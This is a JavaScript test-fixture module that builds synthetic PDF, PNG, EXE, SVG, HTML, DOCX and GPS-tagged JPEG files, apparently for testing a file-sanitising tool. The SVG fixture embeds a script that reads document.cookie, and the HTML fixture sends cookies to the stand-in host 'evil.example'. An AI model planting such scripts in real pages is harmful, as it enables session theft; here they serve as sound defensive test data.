// @ts-check
// Synthetic sample files for the demo and tests (no binary fixtures in the repo).

/** Marker values used as GPS coordinates so tests can prove they are gone. */
export const GPS_MARKERS = [0x0badc0de, 0x0b16b00b, 0x0defaced];

export function makePdf(text = 'Signed contract') {
  const body = `%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\n% ${text}\ntrailer << /Root 1 0 R >>\n%%EOF\n`;
  return Buffer.from(body.padEnd(6000, ' '), 'latin1');
}

export function makePng() {
  const sig = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  return Buffer.concat([sig, Buffer.from('0000000d49484452000000010000000108060000001f15c489', 'hex'), Buffer.alloc(200)]);
}

export function makeExe() {
  return Buffer.concat([Buffer.from('MZ\x90\x00', 'latin1'), Buffer.from('This program cannot be run in DOS mode.'), Buffer.alloc(5000)]);
}

export function makeSvg() {
  return Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>');
}

export function makeHtml() {
  return Buffer.from('<!DOCTYPE html><html><body><script>fetch("https://evil.example/?c="+document.cookie)</script></body></html>');
}

export function makeDocx() {
  const name = Buffer.from('[Content_Types].xml');
  const header = Buffer.alloc(30);
  header.writeUInt32LE(0x04034b50, 0);
  header.writeUInt16LE(name.length, 26);
  return Buffer.concat([header, name, Buffer.from('<Types><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'), Buffer.alloc(800)]);
}

/** JPEG with EXIF (orientation + GPS block) and an XMP block, then image data. */
export function makeJpegWithGps() {
  // TIFF (little endian): header(8) + IFD0 (2 entries) + GPS IFD (2 entries) + rationals
  const tiff = Buffer.alloc(8 + 2 + 2 * 12 + 4 + 2 + 2 * 12 + 4 + 24);
  tiff.write('II', 0, 'latin1');
  tiff.writeUInt16LE(0x2a, 2);
  tiff.writeUInt32LE(8, 4);
  let o = 8;
  tiff.writeUInt16LE(2, o); o += 2;
  tiff.writeUInt16LE(0x0112, o); tiff.writeUInt16LE(3, o + 2); tiff.writeUInt32LE(1, o + 4); tiff.writeUInt16LE(6, o + 8); o += 12; // Orientation = 6
  const gpsIfd = 8 + 2 + 24 + 4;
  tiff.writeUInt16LE(0x8825, o); tiff.writeUInt16LE(4, o + 2); tiff.writeUInt32LE(1, o + 4); tiff.writeUInt32LE(gpsIfd, o + 8); o += 12;
  tiff.writeUInt32LE(0, o); o += 4; // next IFD
  tiff.writeUInt16LE(2, o); o += 2;
  const rationals = gpsIfd + 2 + 24 + 4;
  tiff.writeUInt16LE(0x0001, o); tiff.writeUInt16LE(2, o + 2); tiff.writeUInt32LE(2, o + 4); tiff.write('N\0', o + 8, 'latin1'); o += 12; // GPSLatitudeRef
  tiff.writeUInt16LE(0x0002, o); tiff.writeUInt16LE(5, o + 2); tiff.writeUInt32LE(3, o + 4); tiff.writeUInt32LE(rationals, o + 8); o += 12; // GPSLatitude
  tiff.writeUInt32LE(0, o); o += 4;
  GPS_MARKERS.forEach((v, i) => { tiff.writeUInt32LE(v, rationals + i * 8); tiff.writeUInt32LE(1, rationals + i * 8 + 4); });

  const exifPayload = Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), tiff]);
  const app1 = segment(0xe1, exifPayload);
  const xmp = segment(0xe1, Buffer.from('http://ns.adobe.com/xap/1.0/\0<x:xmpmeta><exif:GPSLatitude>40,26.767N</exif:GPSLatitude></x:xmpmeta>', 'latin1'));
  const app0 = segment(0xe0, Buffer.from('JFIF\0\x01\x01\0\0\x01\0\x01\0\0', 'latin1'));
  const sos = Buffer.concat([Buffer.from([0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00]), Buffer.alloc(3000, 0x55)]);
  return Buffer.concat([Buffer.from([0xff, 0xd8]), app0, app1, xmp, sos, Buffer.from([0xff, 0xd9])]);
}

function segment(marker, payload) {
  const h = Buffer.from([0xff, marker, 0, 0]);
  h.writeUInt16BE(payload.length + 2, 2);
  return Buffer.concat([h, payload]);
}

/** True if any GPS marker value is still present in the bytes. */
export function hasGps(buf) {
  return GPS_MARKERS.some((v) => {
    const b = Buffer.alloc(4);
    b.writeUInt32LE(v);
    return buf.includes(b);
  }) || buf.includes(Buffer.from('GPSLatitude'));
}

/** Orientation tag (0x0112 = 6) still present. */
export function hasOrientation(buf) {
  return buf.includes(Buffer.from([0x12, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00]));
}
